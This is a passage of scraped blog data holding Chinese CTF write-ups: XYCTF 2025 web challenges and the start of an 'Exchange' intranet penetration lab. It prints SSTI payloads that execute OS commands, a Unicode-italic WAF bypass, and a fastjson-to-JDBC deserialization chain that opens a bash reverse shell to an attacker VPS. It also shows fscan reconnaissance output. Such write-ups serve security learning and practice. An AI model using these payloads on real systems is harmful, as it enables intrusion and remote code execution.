text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 17Connection: close 18 19GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(bui=request.mimetype))%}{%23 HTTP/1.1 20Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 21Content-Type: __builtins__ 22Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 23Connection: close 24 25GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(ev=request.mimetype))%}{%23 HTTP/1.1 26Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 27Content-Type: eval 28Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 29Connection: close 30 31GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.glb|attr(a.get)(a.bui)|attr(a.get)(a.ev)(request.mimetype))%}{%23 HTTP/1.1 32Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 33Content-Type: __import__(\u0026#39;os\u0026#39;).popen(\u0026#39;mkdir static;cat /flag_h3r3 \u0026gt; static/flag\u0026#39;).read() 34Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 35Connection: close 访问/static/flag拿到flag\n‍\nNow you see me 2 这题跟上题打法一样，只是更换了传参的方式\n1GET /H3dden_route?spell=fly-%23}{%set%09a=config%}{%print(a.update(clss=a|attr(request.range.units)))%}{%23 HTTP/1.1 2Host: 127.0.0.1:5000 3Range: __class__=100-200 4Connection: close 拿到一张图片，用在线解密提取图片隐藏信息，无需密码\n1flag{__M@g1c1@ans_M@stering_M@g1c__} ‍\n出题人已疯 题目源码\n1# -*- encoding: utf-8 -*- 2\u0026#39;\u0026#39;\u0026#39; 3@File : app.py 4@Time : 2025/03/29 15:52:17 5@Author : LamentXU 6\u0026#39;\u0026#39;\u0026#39; 7import bottle 8\u0026#39;\u0026#39;\u0026#39; 9flag in /flag 10\u0026#39;\u0026#39;\u0026#39; 11@bottle.route(\u0026#39;/\u0026#39;) 12def index(): 13 return \u0026#39;Hello, World!\u0026#39; 14@bottle.route(\u0026#39;/attack\u0026#39;) 15def attack(): 16 payload = bottle.request.query.get(\u0026#39;payload\u0026#39;) 17 if payload and len(payload) \u0026lt; 25 and \u0026#39;open\u0026#39; not in payload and \u0026#39;\\\\\u0026#39; not in payload: 18 return bottle.template(\u0026#39;hello \u0026#39;+payload) 19 else: 20 bottle.abort(400, \u0026#39;Invalid payload\u0026#39;) 21if __name__ == \u0026#39;__main__\u0026#39;: 22 bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 用 import 加载模块，然后修改属性去实现变量持久化，从而去 RCE，然后可以用模板函数 include 去读文件\n1%0a%import+os;os.a=\u0026#39;__imp\u0026#39; 2%0a%import+os;os.b=\u0026#39;ort__\u0026#39; 3%0a%import+os;os.a%2B=os.b 4%0a%import+os;os.b=\u0026#39;(\u0026#34;os\u0026#34;\u0026#39; 5%0a%import+os;os.a%2B=os.b 6%0a%import+os;os.b=\u0026#39;).sys\u0026#39; 7%0a%import+os;os.a%2B=os.b 8%0a%import+os;os.b=\u0026#39;tem(\u0026#34;\u0026#39; 9%0a%import+os;os.a%2B=os.b 10%0a%import+os;os.b=\u0026#39;ca\u0026#39; 11%0a%import+os;os.a%2B=os.b 12%0a%import+os;os.b=\u0026#39;t+/f*\u0026#39; 13%0a%import+os;os.a%2B=os.b 14%0a%import+os;os.b=\u0026#39;\u0026gt;1\u0026#34;)\u0026#39; 15%0a%import+os;os.a%2B=os.b 16%0a%import+os;exec(os.a) 17 18%0a%import os;eval(os.a) 19%0a%include(\u0026#39;1\u0026#39;) ‍\nez_puzzle 非预期 查看puzzle.js，看到有一大段base64\ncyberchef转换一下\n发现是zlib\n看到一串hex\n反转一下转字符串就能拿到flag\n预期解 这题打开控制台会触发反调试\n右键从忽略列表中移除即可\n在代码中可以找到startTime和endTime，猜测应该是endTime-startTime来判断时间，所以直接在控制台给startTime赋一个大值\nstartTime=66666666666666 然后把拼图拼好即可拿到flag\n出题人又疯(复现) 聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass - LamentXU - 博客园\n这题主要是由于bottle框架中对编码检查的不严谨，所以可以利用python中会将exec执行的代码中的斜体字转换为对应的ASCII字符的特性来绕过waf。但是由于url编码问题，题目环境中只有o和a能够成功。\n详细的得看lamentxu师傅的博客。\n所以这题我们就可以把\n\u0026#39;o\u0026#39;替换为\u0026#39;%ba\u0026#39;, \u0026#39;a\u0026#39;替换为\u0026#39;%aa\u0026#39;, payload\n{{open(\u0026#39;/flag\u0026#39;).read()}} 替换 {\\{%bapen(\u0026#39;/flag\u0026#39;).read()}} //这里的\u0026#34;\\\u0026#34;是防止hugo报错加的，实际bu ","permalink":"http://localhost:1313/post/xyctf_2025/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"signin\"\u003e\u003cstrong\u003eSignin\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e题目\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-Dockerfile\" data-lang=\"Dockerfile\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# -*- encoding: utf-8 -*-\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@File    :   main.py\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@Time    :   2025/03/28 22:20:49\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@Author  :   LamentXU \u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003eflag in /flag_\u003cspan class=\"o\"\u003e{\u003c/span\u003euuid4\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003efrom\u003c/span\u003e\u003cspan class=\"s\"\u003e bottle import Bottle, request, response, redirect, static_file, run, route\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003ewith open\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;../../secret.txt\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;r\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e as f:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    \u003cspan class=\"nv\"\u003esecret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e f.read\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"nv\"\u003eapp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Bottle\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@route\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003edef index\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u0026#39;HI\u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@route\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/download\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003edef download\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    \u003cspan class=\"nv\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e request.query.filename\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;../../\u0026#39;\u003c/span\u003e in name or name.startswith\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e or name.startswith\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;../\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e or \u003cspan class=\"s1\"\u003e\u0026#39;\\\\\u0026#39;\u003c/span\u003e in name:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        response.status \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e403\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Forbidden\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e24\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    with open\u003cspan class=\"o\"\u003e(\u003c/span\u003ename, \u003cspan class=\"s1\"\u003e\u0026#39;rb\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e as f:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e25\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"nv\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e f.read\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e26\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e data\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e27\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e28\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@route\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/secret\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e29\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003edef secret_page\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e30\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    try:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e31\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"nv\"\u003esession\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e request.get_cookie\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003esecret\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esecret\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e32\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e not session or session\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;guest\u0026#34;\u003c/span\u003e:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e33\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e            \u003cspan class=\"nv\"\u003esession\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;guest\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e34\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e            response.set_cookie\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e, session, \u003cspan class=\"nv\"\u003esecret\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esecret\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e35\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Forbidden!\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e36\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e session\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;admin\u0026#34;\u003c/span\u003e:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e37\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;The secret has been deleted!\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e38\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    except:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e39\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Error!\u0026#34;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e40\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003erun\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003ehost\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0.0.0.0\u0026#39;\u003c/span\u003e, \u003cspan class=\"nv\"\u003eport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e8080, \u003cspan class=\"nv\"\u003edebug\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eFalse\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e目录穿越拿secret\u003c/p\u003e","title":"XYCTF-2025-Web-Writeup"},{"content":"靶标介绍：\nExchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。\nFLAG1 首先用fscan信息收集一手\n1 .\\fscan.exe -h 39.98.127.105 -p 1-65535 2 3 ___ _ 4 / _ \\ ___ ___ _ __ __ _ ___| | __ 5 / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / 6/ /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; 7\\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ 8 fscan version: 1.8.1 9start infoscan 10(icmp) Target 39.98.127.105 is alive 11[*] Icmp alive hosts len is: 1 1239.98.127.105:80 open 1339.98.127.105:22 open 1439.98.127.105:8000 open 15[*] alive ports len is: 3 16start vulscan 17[*] WebTitle:http://39.98.127.105 code:200 len:19813 title:lumia 18[*] WebTitle:http://39.98.127.105:8000 code:302 len:0 title:None 跳转url: http://39.98.127.105:8000/login.html 19[*] WebTitle:http://39.98.127.105:8000/login.html code:200 len:5662 title:Lumia ERP 20已完成 3/3 21[*] 扫描结束,耗时: 5m26.1641278s 80端口是一个介绍产品的网站\n8000端口应该是网站的后台\n看到后台可以注册用户，我们注册一个\n成功进入后台\n华夏ERP v2.3存在一处fastjson反序列化漏洞\nJava 代码审计之华夏 ERP CMS v2.3 - FreeBuf网络安全行业门户\nFastjson版本是 1.2.55\n构造dns请求验证一下\n{\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet4Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;ysgbayuskh.iyhc.eu.org\u0026#34;} 验证漏洞\n这里我们可以通过evil-mysql-server和ysoserial构造恶意mysql服务打jdbc\n./evil-mysql-server -addr 3366 -java java -ysoserial ysoserial-all.jar exp\n{\r\u0026#34;name\u0026#34;: {\r\u0026#34;@type\u0026#34;: \u0026#34;java.lang.AutoCloseable\u0026#34;,\r\u0026#34;@type\u0026#34;: \u0026#34;com.mysql.jdbc.JDBC4Connection\u0026#34;,\r\u0026#34;hostToConnectTo\u0026#34;: \u0026#34;vpsIP地址\u0026#34;,\r\u0026#34;portToConnectTo\u0026#34;: 3366,\r\u0026#34;info\u0026#34;: {\r\u0026#34;user\u0026#34;: \u0026#34;yso_CommonsCollections6_bash -c {echo,base64编码后的命令}|{base64,-d}|{bash,-i}\u0026#34;,\r\u0026#34;password\u0026#34;: \u0026#34;pass\u0026#34;,\r\u0026#34;statementInterceptors\u0026#34;: \u0026#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;,\r\u0026#34;autoDeserialize\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;NUM_HOSTS\u0026#34;: \u0026#34;1\u0026#34;\r}\r} 成功弹shell\n有root权限，直接读flag\n1root@iZ8vb6bns5dh59k418a97hZ:/root/flag# cat f* 2cat f* 3 ██ ██ ██ ██ ███████ ███████ ██ ████ ██ ████████ 4░░██ ██ ░██ ████ ██░░░░░██ ░██░░░░██ ████ ░██░██ ░██ ██░░░░░░██ 5 ░░██ ██ ░██ ██░░██ ██ ░░██░██ ░██ ██░░██ ░██░░██ ░██ ██ ░░ 6 ░░███ ░██ ██ ░░██ ░██ ░██░███████ ██ ░░██ ░██ ░░██ ░██░██ 7 ██░██ ░██ ██████████░██ ░██░██░░░██ ██████████░██ ░░██░██░██ █████ 8 ██ ░░██ ░██░██░░░░░░██░░██ ██ ░██ ░░██ ░██░░░░░░██░██ ░░████░░██ ░░░░██ 9 ██ ░░██░██░██ ░██ ░░███████ ░██ ░░██░██ ░██░██ ░░███ ░░████████ 10░░ ░░ ░░ ░░ ░░ ░░░░░░░ ░░ ░░ ░░ ░░ ░░ ░░░ ░░░░░░░░ 11 12 | | || | /~~\\ /\\ |\\ /|~|~ 13 | | ||--|| |/__\\ | \\/ | | 14 \\/ \\/ | | \\__// \\| |_|_ 15 16 flag01: flag{f605c397-0df7-4f55-b013-c7e45be124d0} FLAG2 root@iZ8vb6bns5dh59k418a97hZ:/tmp# ip addr\r1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\rlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\rinet 127.0.0.1/8 scope host lo\rvalid_lft forever preferred_lft forever\rinet6 ::1/128 scope host valid_lft forever preferred_lft forever\r2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000\rlink/ether 00:16:3e:1c:80:b4 brd ff:ff:ff:ff:ff:ff\rinet 172.22.3.12/16 brd 172.22.255.255 scope global eth0\rvalid_lft forever preferred_lft forever\rinet6 fe80::216:3eff:fe1c:80b4/64 scope link valid_lft forever preferred_lft forever 传个fscan信息收集一波\n1root@iZ8vb6bns5dh59k418a97hZ:/tmp# ./fscan -h 172.22.3.0/24 -eh 172.22.3.12 -p 1-65535 2┌──────────────────────────────────────────────┐ 3│ ___ _ │ 4│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 5│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 6│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 7│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 8└──────────────────────────────────────────────┘ 9 Fscan Version: 2.0.0 10 11[2025-04-09 00:51:47] [INFO] 暴力破解线程数: 1 12[2025-04-09 00:51:47] [INFO] 开始信息扫描 13[2025-04-09 00:51:47] [INFO] CIDR范围: 172.22.3.0-172.22.3.255 14[2025-04-09 00:51:47] [INFO] 